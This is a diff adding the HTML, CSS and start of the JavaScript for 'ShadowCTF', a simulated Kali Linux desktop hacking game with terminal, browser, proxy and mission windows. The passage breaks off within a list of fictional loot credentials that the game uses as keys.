@@ -1,0 +1,1885 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover">
+<title>Kali Linux — ShadowCTF</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
+:root{
+  --bg:#1e1e2e;--bg2:#181825;--bg3:#11111b;
+  --border:#313244;--sel:#45475a;
+  --green:#a6e3a1;--red:#f38ba8;--yellow:#f9e2af;--blue:#89b4fa;
+  --purple:#cba6f7;--cyan:#89dceb;--orange:#fab387;
+  --fg:#cdd6f4;--fg2:#bac2de;--dim:#6c7086;
+  --safe:env(safe-area-inset-bottom,0px);
+}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+html,body{width:100%;height:100%;overflow:hidden;font-family:'JetBrains Mono','Courier New',monospace;background:#000;color:var(--fg);-webkit-text-size-adjust:100%;}
+.scr{position:fixed;inset:0;display:none;flex-direction:column;}
+.scr.on{display:flex;}
+
+/* BOOT */
+#scr-boot{background:#000;padding:10px 14px;}
+#bout{flex:1;overflow-y:auto;-webkit-overflow-scrolling:touch;}
+#bout::-webkit-scrollbar{display:none;}
+.bl{font-size:clamp(9px,2vw,11px);line-height:1.5;white-space:pre-wrap;word-break:break-word;}
+.bk{color:#50fa7b;}.bw{color:#f1fa8c;}.bb2{color:#8be9fd;}.bd{color:#6272a4;}.bf{color:#f8f8f2;}
+
+/* LOGIN */
+#scr-login{background:var(--bg);justify-content:center;align-items:center;position:relative;overflow:hidden;}
+#lwp{position:absolute;inset:0;
+  background:radial-gradient(ellipse 70% 50% at 50% 110%,#0f3460 0%,transparent 60%),
+  linear-gradient(135deg,#0d0d1a 0%,#1a1a2e 40%,#0f3460 100%);}
+#lwp::after{content:'';position:absolute;inset:0;opacity:.05;
+  background-image:linear-gradient(rgba(137,180,250,.5) 1px,transparent 1px),linear-gradient(90deg,rgba(137,180,250,.5) 1px,transparent 1px);
+  background-size:48px 48px;}
+#lbox{position:relative;z-index:2;background:rgba(30,30,46,.92);border:1px solid var(--border);border-radius:8px;padding:30px 26px;width:min(295px,88vw);text-align:center;}
+#lav{width:58px;height:58px;border-radius:50%;background:linear-gradient(135deg,var(--purple),var(--blue));margin:0 auto 10px;display:flex;align-items:center;justify-content:center;font-size:25px;border:2px solid var(--border);}
+#lun{color:var(--fg);font-size:13px;font-weight:700;margin-bottom:2px;}
+#lhost{color:var(--dim);font-size:10px;margin-bottom:16px;}
+#lpwr{display:flex;background:rgba(49,50,68,.8);border:1px solid var(--border);border-radius:4px;overflow:hidden;margin-bottom:7px;}
+#linp{flex:1;padding:10px 12px;background:transparent;border:none;color:var(--fg);font-family:inherit;font-size:13px;outline:none;-webkit-user-select:text;user-select:text;-webkit-appearance:none;caret-color:var(--blue);letter-spacing:2px;}
+#linp::placeholder{letter-spacing:0;color:var(--dim);}
+#lgo{padding:10px 14px;background:var(--blue);border:none;color:#1e1e2e;font-weight:700;font-family:inherit;font-size:13px;cursor:pointer;-webkit-appearance:none;}
+#lgo:active{background:var(--purple);}
+#lerr{color:var(--red);font-size:10px;min-height:14px;}
+#lhint{color:var(--dim);font-size:9px;margin-top:8px;line-height:1.6;}
+
+/* DESKTOP */
+#scr-desk{background:#08080f;}
+#wp{position:fixed;inset:0;z-index:0;pointer-events:none;
+  background:
+    radial-gradient(ellipse 90% 60% at 50% 120%,#12122e 0%,transparent 50%),
+    radial-gradient(ellipse 60% 50% at 88% 8%,#240a3e 0%,transparent 42%),
+    radial-gradient(ellipse 45% 60% at 4% 88%,#0a1830 0%,transparent 38%),
+    radial-gradient(ellipse 100% 100% at 50% 50%,#10101e 0%,#06060e 100%);}
+#wp::before{content:'';position:absolute;inset:0;
+  background-image:linear-gradient(rgba(137,180,250,.12) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(137,180,250,.12) 1px,transparent 1px);
+  background-size:46px 46px;}
+#wp::after{content:'';position:absolute;inset:0;pointer-events:none;
+  background:
+    radial-gradient(ellipse 35% 30% at 78% 18%,rgba(203,166,247,.12) 0%,transparent 55%),
+    radial-gradient(ellipse 28% 22% at 18% 72%,rgba(137,180,250,.10) 0%,transparent 50%);}
+
+/* PANEL */
+#panel{position:fixed;top:0;left:0;right:0;z-index:2000;height:26px;
+  background:rgba(16,16,28,.97);border-bottom:1px solid var(--border);
+  display:flex;align-items:center;padding:0 5px;gap:2px;}
+#pmb{padding:0 9px;height:100%;display:flex;align-items:center;gap:5px;cursor:pointer;color:var(--fg);font-size:11px;border-radius:2px;user-select:none;-webkit-user-select:none;position:relative;}
+#pmb:active,#pmb.open{background:var(--sel);}
+.psep{width:1px;height:14px;background:var(--border);margin:0 2px;}
+.pab{padding:0 7px;height:20px;display:flex;align-items:center;gap:4px;background:transparent;border:1px solid transparent;border-radius:2px;cursor:pointer;color:var(--fg2);font-size:10px;font-family:inherit;-webkit-appearance:none;white-space:nowrap;}
+.pab:active,.pab.act{background:var(--sel);border-color:var(--border);color:var(--fg);}
+.pab .dot{width:5px;height:5px;border-radius:50%;background:var(--dim);flex-shrink:0;}
+.pab.act .dot{background:var(--blue);}
+#pr{margin-left:auto;display:flex;align-items:center;gap:8px;}
+#pflags{color:var(--yellow);font-size:9.5px;}
+.pst{color:var(--dim);font-size:9px;}
+#pclk{color:var(--fg2);font-size:10px;}
+#amenu{position:absolute;top:26px;left:0;background:rgba(16,16,28,.98);border:1px solid var(--border);border-radius:0 4px 4px 4px;min-width:168px;z-index:3000;display:none;}
+#amenu.on{display:block;}
+.ami{display:flex;align-items:center;gap:9px;padding:7px 13px;cursor:pointer;font-size:11px;color:var(--fg2);border-bottom:1px solid rgba(49,50,68,.4);}
+.ami:last-child{border:none;}
+.ami:active{background:var(--sel);color:var(--fg);}
+.amico{font-size:13px;width:16px;text-align:center;}
+
+/* DESKTOP CANVAS */
+#desk{position:fixed;top:26px;left:0;right:0;bottom:0;z-index:1;overflow:hidden;pointer-events:none;}
+.dico{position:fixed;display:flex;flex-direction:column;align-items:center;gap:3px;padding:7px 5px 5px;width:72px;border-radius:6px;cursor:pointer;border:1px solid transparent;user-select:none;-webkit-user-select:none;touch-action:none;pointer-events:auto;z-index:100;}
+.dico:hover,.dico.sel{background:rgba(137,180,250,.1);border-color:rgba(137,180,250,.25);}
+.dico.dragging{opacity:.7;z-index:999;}
+.dico-em{font-size:26px;line-height:1;}
+.dico-label{font-size:9px;color:var(--fg2);text-align:center;text-shadow:0 1px 4px rgba(0,0,0,.9);line-height:1.25;word-break:break-word;max-width:68px;}
+.dfil{position:fixed;display:flex;flex-direction:column;align-items:center;gap:3px;padding:6px 4px 4px;width:62px;border-radius:5px;cursor:pointer;border:1px solid transparent;user-select:none;-webkit-user-select:none;touch-action:none;pointer-events:auto;z-index:100;}
+.dfil:hover,.dfil.sel{background:rgba(137,180,250,.1);border-color:rgba(137,180,250,.25);}
+.dfil.dragging{opacity:.7;z-index:999;}
+.dfil-em{font-size:20px;line-height:1;}
+.dfil-label{font-size:8.5px;color:var(--fg2);text-align:center;text-shadow:0 1px 4px rgba(0,0,0,.9);line-height:1.2;word-break:break-word;max-width:58px;}
+.dfil-new{animation:popIn .35s ease;}
+@keyframes popIn{from{opacity:0;transform:scale(.4)}to{opacity:1;transform:scale(1)}}
+
+/* WINDOWS */
+.wovl{position:fixed;inset:0;z-index:500;display:none;align-items:center;justify-content:center;padding:26px 3px 3px;}
+.wovl.on{display:flex;}
+.xwin{background:var(--border);border-radius:6px;overflow:hidden;display:flex;flex-direction:column;width:min(620px,99vw);height:min(540px,calc(100vh - 32px));box-shadow:0 8px 40px rgba(0,0,0,.75),0 0 0 1px rgba(137,180,250,.06);animation:wo .12s ease;}
+.xwin.sm{height:min(420px,calc(100vh - 32px));}
+@keyframes wo{from{opacity:0;transform:scale(.96)}to{opacity:1;transform:scale(1)}}
+.xtbar{height:26px;display:flex;align-items:center;background:linear-gradient(180deg,#313244,#28283c);padding:0 8px;gap:5px;flex-shrink:0;border-bottom:1px solid rgba(255,255,255,.05);}
+.xbtns{display:flex;gap:5px;flex-shrink:0;}
+.xb{width:12px;height:12px;border-radius:50%;border:none;cursor:pointer;-webkit-appearance:none;flex-shrink:0;}
+.xb:active{opacity:.6;}
+.xbc{background:#f38ba8;}.xbm{background:#f9e2af;}.xbx{background:#a6e3a1;}
+.xlbl{flex:1;text-align:center;font-size:11px;color:var(--fg);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.xbody{flex:1;overflow:hidden;display:flex;flex-direction:column;background:var(--bg);min-height:0;}
+
+/* Terminal */
+.tout{flex:1;overflow-y:auto;padding:6px 10px 3px;font-size:clamp(10px,2.1vw,12px);line-height:1.5;-webkit-overflow-scrolling:touch;word-break:break-word;white-space:pre-wrap;}
+.tout::-webkit-scrollbar{width:3px;}
+.tout::-webkit-scrollbar-thumb{background:var(--border);}
+.tiline{display:flex;align-items:center;padding:5px 10px;padding-bottom:calc(5px + var(--safe));border-top:1px solid var(--border);background:var(--bg2);flex-shrink:0;}
+.pu{color:var(--green);font-weight:700;}.pa{color:var(--dim);}.ph{color:var(--purple);font-weight:700;}.pp{color:var(--blue);}.pd{color:var(--fg);margin:0 5px;}
+.tiline input{flex:1;background:transparent;border:none;color:var(--fg);font-family:inherit;font-size:clamp(12px,3vw,13px);outline:none;caret-color:var(--green);-webkit-user-select:text;user-select:text;-webkit-appearance:none;min-width:0;}
+.g{color:var(--green);}.r{color:var(--red);}.y{color:var(--yellow);}.b{color:var(--blue);}.p{color:var(--purple);}.c{color:var(--cyan);}.d{color:var(--dim);}.f{color:var(--fg);}
+.fline{display:inline-block;background:rgba(166,227,161,.1);border:1px solid var(--green);color:var(--green);padding:2px 8px;border-radius:2px;font-weight:700;margin:2px 0;}
+.lline{display:inline-block;background:rgba(243,139,168,.07);border:1px solid var(--red);color:var(--red);padding:2px 8px;border-radius:2px;}
+.hint-box{background:rgba(249,226,175,.07);border-left:3px solid var(--yellow);color:var(--yellow);padding:4px 8px;border-radius:0 3px 3px 0;margin:3px 0;font-size:10px;}
+
+/* Browser */
+.bbar{display:flex;align-items:center;gap:5px;padding:5px 8px;background:var(--bg2);border-bottom:1px solid var(--border);flex-shrink:0;}
+.bbar button{padding:3px 9px;background:var(--sel);border:1px solid var(--border);color:var(--fg2);font-family:inherit;font-size:10px;border-radius:2px;cursor:pointer;-webkit-appearance:none;flex-shrink:0;}
+.bbar button:active{background:var(--border);}
+#binp{flex:1;padding:4px 8px;background:rgba(49,50,68,.8);border:1px solid var(--border);color:var(--fg);font-family:inherit;font-size:11px;border-radius:3px;outline:none;-webkit-user-select:text;user-select:text;-webkit-appearance:none;min-width:0;}
+#binp:focus{border-color:var(--blue);}
+.bqrow{padding:3px 8px;background:var(--bg2);border-bottom:1px solid var(--border);display:flex;flex-wrap:wrap;gap:4px;flex-shrink:0;}
+.bql{color:var(--blue);font-size:9.5px;cursor:pointer;text-decoration:underline;padding:1px 3px;border-radius:2px;}
+.bql:active{background:var(--sel);}
+.bql.lk{color:var(--dim);text-decoration:none;cursor:default;}
+.bpage{flex:1;overflow-y:auto;padding:10px;font-size:11px;line-height:1.5;-webkit-overflow-scrolling:touch;background:var(--bg3);}
+.bpage::-webkit-scrollbar{width:3px;}
+.pt{color:var(--blue);font-size:12px;font-weight:700;border-bottom:1px solid var(--border);padding-bottom:5px;margin-bottom:8px;}
+.bi{width:100%;padding:7px 8px;margin:3px 0;background:rgba(49,50,68,.7);border:1px solid var(--border);color:var(--fg);font-family:inherit;font-size:11px;border-radius:3px;outline:none;-webkit-user-select:text;user-select:text;-webkit-appearance:none;}
+.bi:focus{border-color:var(--blue);}
+textarea.bi{min-height:48px;resize:vertical;}
+.bb3{padding:5px 12px;background:var(--sel);border:1px solid var(--border);color:var(--fg);font-family:inherit;font-size:11px;border-radius:3px;cursor:pointer;-webkit-appearance:none;margin-top:4px;}
+.bb3:active{background:var(--border);}
+.fb{background:rgba(166,227,161,.1);border:1px solid var(--green);color:var(--green);padding:5px 9px;border-radius:3px;margin:5px 0;font-weight:700;font-size:11px;}
+.wb{background:rgba(249,226,175,.07);border-left:3px solid var(--yellow);color:var(--yellow);padding:4px 8px;border-radius:0 3px 3px 0;margin:3px 0;font-size:10px;}
+.eb{background:rgba(243,139,168,.07);border-left:3px solid var(--red);color:var(--red);padding:4px 8px;border-radius:0 3px 3px 0;margin:3px 0;font-size:10px;}
+.lockb{background:rgba(108,112,134,.1);border:1px dashed var(--dim);color:var(--dim);padding:12px;border-radius:4px;text-align:center;font-size:11px;}
+.step-ok{color:var(--green);font-size:10px;}
+.step-todo{color:var(--dim);font-size:10px;}
+
+/* Files */
+.ftb{padding:4px 8px;background:var(--bg2);border-bottom:1px solid var(--border);font-size:10px;color:var(--dim);flex-shrink:0;}
+.ftree{list-style:none;padding:5px;}
+.ftree li{padding:5px 8px;border-radius:3px;font-size:11px;cursor:pointer;margin:1px 0;display:flex;align-items:center;gap:7px;}
+.ftree li:active{background:var(--sel);}
+li.ldir{color:var(--blue);}li.lfile{color:var(--fg2);}li.lexe{color:var(--green);}
+.fprev{border-top:1px solid var(--border);padding:8px;font-size:10px;line-height:1.5;background:var(--bg3);flex-shrink:0;max-height:38%;overflow-y:auto;display:none;white-space:pre-wrap;color:var(--fg2);-webkit-overflow-scrolling:touch;}
+.fprev.on{display:block;}
+
+/* Proxy */
+.ptb{padding:5px 8px;background:var(--bg2);border-bottom:1px solid var(--border);display:flex;gap:4px;flex-shrink:0;flex-wrap:wrap;}
+.ptb button{padding:3px 9px;background:var(--sel);border:1px solid var(--border);color:var(--fg2);font-family:inherit;font-size:10px;border-radius:2px;cursor:pointer;-webkit-appearance:none;}
+.ptb button:active{background:var(--border);}
+.ptable{flex:1;overflow-y:auto;padding:3px;-webkit-overflow-scrolling:touch;}
+.prow{display:flex;gap:5px;padding:4px 6px;font-size:10px;border-radius:2px;margin:1px 0;border:1px solid transparent;cursor:pointer;}
+.prow:active,.prow.sel{background:var(--sel);border-color:var(--border);}
+.pm{color:var(--blue);width:34px;flex-shrink:0;font-weight:700;}
+.pco{width:28px;flex-shrink:0;}
+.pc2{color:var(--green);}.pc3{color:var(--yellow);}.pc4{color:var(--red);}
+.pu3{flex:1;color:var(--fg2);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.pt3{color:var(--dim);width:36px;flex-shrink:0;text-align:right;}
+
+/* Missions */
+.mlist{padding:5px;}
+.mitem{padding:8px 10px;border-left:3px solid var(--border);margin:3px 0;border-radius:0 4px 4px 0;font-size:10px;line-height:1.5;background:rgba(49,50,68,.2);}
+.mitem.done{border-left-color:var(--green);background:rgba(166,227,161,.05);color:var(--green);}
+.mitem.lk{border-left-color:var(--dim);opacity:.4;}
+.mname{font-weight:700;font-size:11px;margin-bottom:2px;}
+.mtgt{color:var(--dim);font-size:9px;}
+.msteps{font-size:9px;margin-top:4px;line-height:1.6;}
+.mhint{color:var(--yellow);font-size:9px;margin-top:3px;border-top:1px dashed rgba(249,226,175,.2);padding-top:3px;}
+
+/* RDP */
+.wovl#wovl-rdp .xwin{height:min(560px,calc(100vh - 32px));}
+
+/* File viewer */
+#fv{position:fixed;inset:0;z-index:3000;background:rgba(0,0,0,.65);display:none;align-items:center;justify-content:center;padding:4px;}
+#fv.on{display:flex;}
+#fvbox{background:var(--bg);border:1px solid var(--border);border-radius:6px;width:min(520px,99vw);max-height:85vh;display:flex;flex-direction:column;box-shadow:0 8px 40px rgba(0,0,0,.8);}
+#fvtitle{height:26px;display:flex;align-items:center;background:linear-gradient(180deg,#313244,#28283c);padding:0 8px;border-radius:6px 6px 0 0;flex-shrink:0;}
+#fvcontent{flex:1;overflow-y:auto;padding:10px 12px;font-size:11px;line-height:1.6;white-space:pre-wrap;color:var(--fg2);-webkit-overflow-scrolling:touch;background:var(--bg3);}
+
+/* Notif */
+#notif{position:fixed;top:32px;right:8px;z-index:9000;display:flex;flex-direction:column;gap:5px;pointer-events:none;}
+.nitem{background:rgba(24,24,37,.97);border:1px solid var(--border);border-left:3px solid var(--green);border-radius:4px;padding:7px 10px;font-size:10px;color:var(--fg);animation:nsl .25s ease;pointer-events:none;max-width:215px;line-height:1.4;}
+.nitem.ul{border-left-color:var(--yellow);}
+@keyframes nsl{from{opacity:0;transform:translateX(18px)}to{opacity:1;transform:translateX(0)}}
+
+/* Progress */
+#pbar{position:fixed;bottom:0;left:0;right:0;height:3px;background:var(--bg2);z-index:10000;}
+#pfill{height:100%;background:linear-gradient(90deg,var(--purple),var(--blue));transition:width .4s ease;width:0%;}
+
+/* Context menu */
+#ctx{position:fixed;z-index:8000;background:rgba(20,20,32,.97);border:1px solid var(--border);border-radius:4px;min-width:130px;display:none;overflow:hidden;}
+#ctx.on{display:block;}
+.citem{padding:7px 14px;font-size:11px;color:var(--fg2);cursor:pointer;}
+.citem:active{background:var(--sel);color:var(--fg);}
+.csep{height:1px;background:var(--border);margin:2px 0;}
+
+/* burst */
+.burst{position:fixed;pointer-events:none;z-index:9999;font-size:18px;animation:burst .7s ease forwards;}
+@keyframes burst{0%{opacity:1;transform:translate(0,0) scale(1)}100%{opacity:0;transform:translate(var(--tx),var(--ty)) scale(.3)}}
+
+::-webkit-scrollbar{width:3px;}
+::-webkit-scrollbar-thumb{background:var(--border);}
+</style>
+</head>
+<body>
+
+<!-- BOOT -->
+<div class="scr on" id="scr-boot"><div id="bout"></div></div>
+
+<!-- LOGIN -->
+<div class="scr" id="scr-login">
+  <div id="lwp"></div>
+  <div id="lbox">
+    <div id="lav">&#128009;</div>
+    <div id="lun">operator</div>
+    <div id="lhost">shadowlab.local</div>
+    <div id="lpwr"><input type="password" id="linp" placeholder="Password" autocomplete="off"><button id="lgo" onclick="doLogin()">&#8594;</button></div>
+    <div id="lerr"></div>
+    <div id="lhint">sh4d0w_0ps &nbsp;|&nbsp; root / toor</div>
+  </div>
+</div>
+
+<!-- DESKTOP -->
+<div class="scr" id="scr-desk">
+  <div id="wp"></div>
+  <div id="panel">
+    <div id="pmb" onclick="toggleMenu()">
+      <span style="font-size:14px;">&#128009;</span>
+      <span style="color:var(--fg2);font-size:11px;">Applications</span>
+    </div>
+    <div id="amenu">
+      <div class="ami" onclick="openWin('terminal');closeMenu()"><span class="amico">&#x2B1B;</span>Terminal</div>
+      <div class="ami" onclick="openWin('browser');closeMenu()"><span class="amico">&#127760;</span>Firefox</div>
+      <div class="ami" onclick="openWin('files');closeMenu()"><span class="amico">&#128193;</span>Files</div>
+      <div class="ami" onclick="openWin('proxy');closeMenu()"><span class="amico">&#128269;</span>Burp Suite</div>
+      <div class="ami" onclick="openWin('wifi');closeMenu()"><span class="amico">&#128246;</span>Airodump-ng</div>
+      <div class="ami" onclick="openWin('missions');closeMenu()"><span class="amico">&#127919;</span>Missions</div>
+      <div class="ami" onclick="openWin('rdp');closeMenu()"><span class="amico">&#128421;</span>RDP Viewer</div>
+    </div>
+    <div class="psep"></div>
+    <button class="pab" id="pa-terminal" onclick="openWin('terminal')"><span class="dot"></span>Terminal</button>
+    <button class="pab" id="pa-browser" onclick="openWin('browser')"><span class="dot"></span>Firefox</button>
+    <button class="pab" id="pa-proxy" onclick="openWin('proxy')"><span class="dot"></span>Burp</button>
+    <div id="pr">
+      <span id="pflags" class="pst">&#9873; 0/33</span>
+      <span class="pst" id="pip">192.168.1.100</span>
+      <span id="pclk">00:00</span>
+    </div>
+  </div>
+  <div id="desk"></div>
+</div>
+
+<!-- TERMINAL -->
+<div class="wovl" id="wovl-terminal">
+  <div class="xwin">
+    <div class="xtbar"><div class="xbtns"><button class="xb xbc" onclick="closeWin('terminal')"></button><button class="xb xbm" onclick="closeWin('terminal')"></button><button class="xb xbx"></button></div><div class="xlbl">&#x2B1B; root@kali: ~</div></div>
+    <div class="xbody">
+      <div class="tout" id="tout"></div>
+      <div class="tiline"><span class="pu">root</span><span class="pa">@</span><span class="ph">kali</span><span class="pa">:</span><span class="pp" id="tcwd">~</span><span class="pd">#</span><input type="text" id="tinp" autocomplete="off" autocorrect="off" autocapitalize="none" spellcheck="false" placeholder="help"></div>
+    </div>
+  </div>
+</div>
+
+<!-- BROWSER -->
+<div class="wovl" id="wovl-browser">
+  <div class="xwin">
+    <div class="xtbar"><div class="xbtns"><button class="xb xbc" onclick="closeWin('browser')"></button><button class="xb xbm" onclick="closeWin('browser')"></button><button class="xb xbx"></button></div><div class="xlbl">&#127760; Firefox ESR</div></div>
+    <div class="xbody">
+      <div class="bbar"><button onclick="navBrowser()">&#8617;</button><input type="text" id="binp" value="http://target1.local" onkeydown="if(event.key==='Enter')navBrowser()"><button onclick="navBrowser()">Go</button></div>
+      <div class="bqrow" id="bqrow"></div>
+      <div class="bpage" id="bpage"></div>
+    </div>
+  </div>
+</div>
+
+<!-- FILES -->
+<div class="wovl" id="wovl-files">
+  <div class="xwin">
+    <div class="xtbar"><div class="xbtns"><button class="xb xbc" onclick="closeWin('files')"></button><button class="xb xbm" onclick="closeWin('files')"></button><button class="xb xbx"></button></div><div class="xlbl">&#128193; Files — /root</div></div>
+    <div class="xbody">
+      <div class="ftb">/root</div>
+      <div style="flex:1;overflow-y:auto;-webkit-overflow-scrolling:touch;"><ul class="ftree" id="ftree"></ul></div>
+      <div class="fprev" id="fprev"></div>
+    </div>
+  </div>
+</div>
+
+<!-- PROXY -->
+<div class="wovl" id="wovl-proxy">
+  <div class="xwin">
+    <div class="xtbar"><div class="xbtns"><button class="xb xbc" onclick="closeWin('proxy')"></button><button class="xb xbm" onclick="closeWin('proxy')"></button><button class="xb xbx"></button></div><div class="xlbl">&#128269; Burp Suite Community</div></div>
+    <div class="xbody">
+      <div class="ptb"><button onclick="proxyReplay()">&#9654; Replay</button><button onclick="proxyClear()">Clear</button><button onclick="proxyToggle()">&#128308; Intercept</button></div>
+      <div class="ptable" id="ptable"></div>
+    </div>
+  </div>
+</div>
+
+<!-- WIFI -->
+<div class="wovl" id="wovl-wifi">
+  <div class="xwin sm">
+    <div class="xtbar"><div class="xbtns"><button class="xb xbc" onclick="closeWin('wifi')"></button><button class="xb xbm" onclick="closeWin('wifi')"></button><button class="xb xbx"></button></div><div class="xlbl">&#128246; airodump-ng wlan0mon</div></div>
+    <div class="xbody">
+      <div style="padding:5px 10px;background:var(--bg2);border-bottom:1px solid var(--border);font-size:10px;color:var(--dim);flex-shrink:0;">CH 11 ][ wlan0mon ][ 0 handshakes</div>
+      <div style="flex:1;overflow-y:auto;-webkit-overflow-scrolling:touch;padding:5px;" id="wlist"><div style="color:var(--dim);font-size:10px;padding:8px;">Press Scan...</div></div>
+      <div style="padding:6px 8px;border-top:1px solid var(--border);background:var(--bg2);flex-shrink:0;"><button style="width:100%;padding:6px;background:var(--sel);border:1px solid var(--border);color:var(--fg);font-family:inherit;font-size:11px;border-radius:3px;cursor:pointer;" onclick="wifiScan()">&#128225; Start Scan</button></div>
+    </div>
+  </div>
+</div>
+
+<!-- MISSIONS -->
+<div class="wovl" id="wovl-missions">
+  <div class="xwin">
+    <div class="xtbar"><div class="xbtns"><button class="xb xbc" onclick="closeWin('missions')"></button><button class="xb xbm" onclick="closeWin('missions')"></button><button class="xb xbx"></button></div><div class="xlbl">&#127919; Missions — <span id="mcount">0</span>/33</div></div>
+    <div class="xbody">
+      <div style="flex:1;overflow-y:auto;-webkit-overflow-scrolling:touch;"><div class="mlist" id="mlist"></div></div>
+      <div style="padding:7px 8px;border-top:1px solid var(--border);background:var(--bg2);flex-shrink:0;display:flex;gap:5px;">
+        <button style="flex:1;padding:6px;background:var(--sel);border:1px solid var(--border);color:var(--fg2);font-family:inherit;font-size:10px;border-radius:3px;cursor:pointer;" onclick="G.hintsOn=true;renderMissions()">&#128161; Hints</button>
+        <button style="flex:1;padding:6px;background:var(--sel);border:1px solid var(--border);color:var(--fg2);font-family:inherit;font-size:10px;border-radius:3px;cursor:pointer;" onclick="openWin('terminal');closeWin('missions')">Terminal</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- RDP -->
+<div class="wovl" id="wovl-rdp">
+  <div class="xwin">
+    <div class="xtbar"><div class="xbtns"><button class="xb xbc" onclick="closeWin('rdp')"></button><button class="xb xbm" onclick="closeWin('rdp')"></button><button class="xb xbx"></button></div><div class="xlbl" id="rdp-title">&#128421; Remote Desktop</div></div>
+    <div class="xbody" style="background:#1a1a2e;">
+      <div style="background:#0d0d1a;border-bottom:1px solid #313244;padding:4px 8px;display:flex;align-items:center;gap:6px;flex-shrink:0;">
+        <span style="font-size:9px;color:#6c7086;">Host:</span>
+        <span id="rdp-conn" style="font-size:9px;color:#89b4fa;"></span>
+        <span id="rdp-status" style="margin-left:auto;font-size:9px;padding:2px 7px;border-radius:2px;background:#313244;color:#f9e2af;">CONNECTING</span>
+      </div>
+      <div id="rdp-screen" style="flex:1;position:relative;overflow:hidden;background:#1e3a5f;min-height:0;">
+        <div style="position:absolute;inset:0;background:linear-gradient(160deg,#1a3a5f,#0d2035 60%,#061020);"></div>
+        <div style="position:absolute;bottom:0;left:0;right:0;height:32px;background:rgba(0,0,0,.85);border-top:1px solid rgba(255,255,255,.1);display:flex;align-items:center;padding:0 6px;gap:4px;">
+          <div style="width:26px;height:22px;background:#0078d4;border-radius:2px;display:flex;align-items:center;justify-content:center;font-size:13px;">&#129419;</div>
+          <div style="flex:1;"></div>
+          <span id="rdp-clk" style="font-size:9px;color:#ccc;"></span>
+        </div>
+        <div id="rdp-icons" style="position:absolute;top:12px;left:12px;display:flex;flex-direction:column;gap:6px;"></div>
+        <div id="rdp-msg" style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.75);z-index:10;">
+          <div style="text-align:center;color:#cdd6f4;font-size:11px;padding:20px;">
+            <div style="font-size:30px;margin-bottom:10px;">&#128421;</div>
+            <div id="rdp-msg-txt">Connecting...</div>
+            <div style="margin-top:12px;width:180px;height:3px;background:#313244;border-radius:2px;margin-left:auto;margin-right:auto;overflow:hidden;">
+              <div id="rdp-bar" style="height:100%;width:0%;background:#89b4fa;transition:width .08s;"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div style="border-top:1px solid #313244;background:#080810;flex-shrink:0;">
+        <div style="padding:3px 8px;font-size:9px;color:#6c7086;border-bottom:1px solid #1a1a2e;">cmd.exe — Administrator</div>
+        <div id="rdp-out" style="padding:5px 8px;font-size:11px;overflow-y:auto;max-height:120px;-webkit-overflow-scrolling:touch;white-space:pre-wrap;color:#a6e3a1;min-height:40px;"></div>
+        <div style="display:flex;align-items:center;padding:3px 8px;border-top:1px solid #1a1a2e;padding-bottom:calc(3px + var(--safe));">
+          <span id="rdp-prompt" style="color:#a6e3a1;font-size:11px;flex-shrink:0;">C:\&gt; </span>
+          <input type="text" id="rdp-inp" style="flex:1;background:transparent;border:none;color:#cdd6f4;font-family:inherit;font-size:11px;outline:none;-webkit-user-select:text;user-select:text;padding-left:4px;" autocomplete="off" autocapitalize="none" spellcheck="false" placeholder="whoami, dir, mimikatz..." onkeydown="rdpKey(event)">
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- File Viewer -->
+<div id="fv" onclick="if(event.target===this)closeFV()">
+  <div id="fvbox">
+    <div id="fvtitle"><div class="xbtns"><button class="xb xbc" onclick="closeFV()"></button><button class="xb xbm"></button><button class="xb xbx"></button></div><div class="xlbl" id="fvname">file.txt</div></div>
+    <div id="fvcontent"></div>
+  </div>
+</div>
+
+<!-- Context Menu -->
+<div id="ctx">
+  <div class="citem" id="ctx-open" onclick="ctxAction('open')">Open</div>
+  <div class="csep"></div>
+  <div class="citem" onclick="ctxAction('delete')">Move to Trash</div>
+</div>
+
+<div id="notif"></div>
+<div id="pbar"><div id="pfill"></div></div>
+
+<script>
+'use strict';
+/* ═══════════════════════════════════════════════
+   GAME STATE
+═══════════════════════════════════════════════ */
+var G = {
+  flags:{},        // captured flags
+  loot:{},         // key-value store: discovered passwords, hashes, tokens
+  proxyLog:[],
+  cwd:'~',
+  hintsOn:false,
+  unlocked:0,      // how many machine tiers open
+  deskIcons:[],
+  deskFiles:[],
+  ctxTarget:null,
+  intercept:false
+};
+
+var CREDS = {operator:'sh4d0w_0ps',root:'toor',admin:'admin123',kali:'kali'};
+
+/* ═══════════════════════════════════════════════
+   LOOT SYSTEM — multi-step exploitation
+   Players must discover credentials/hashes/tokens
+   before they can exploit subsequent machines.
+═══════════════════════════════════════════════ */
+var LOOT_KEYS = {
+  // Passwords found during exploitation
+  wp_db_pass:       'S3cur3_WP_P4ss!',
+  jwt_secret:       'sh4d0w_s3cr3t_k3y_2024',
+  ftp_config_pass:  'W3b@dm1n2024!',
+  drupal_db_pass:   'Drup@l_S3cr3t!',
+  vb_admin_pass:    'vBull3t1n!2024',
+  mongo_pass:       'M0ng0_P4ss',
+  win_ntlm:         '8846f7eaee8fb117ad06bdd830b7586c',
+  win_pass:         'W1nd0ws!',
+  vpn_config:       'Sh4d0w_VPN!',
+  ssh_prod_key:     'prod_deploy_rsa',
+  redis_token:      'redis_t0k3n_h3r3',
+  aws_key:          'AKIA_SHADOW_KEY',
+  aws_secret:       'xK9m_shadow_secret',
+  dc_ntlm:          '4e9815869d2090cc',
+  splunk_pass:      'changeme',
+  hsm_pin:          '1234',
+  plc_access:       's7comm_auth_bypass',
+  mainframe_pass:   'SYS1',
+  vault_root:       'redis_t0k3n_h3r3',
+  palo_session:     'CVE-2024-3400-session',
+  smb_hash:         '8846f7eaee8fb117ad06bdd830b7586c',
+  veeam_pass:       'Backupp@ss!',
+  staging_pass:     'Deploy@2024!',
+  prod_db_pass:     'Pr0d_DB_M4st3r!',
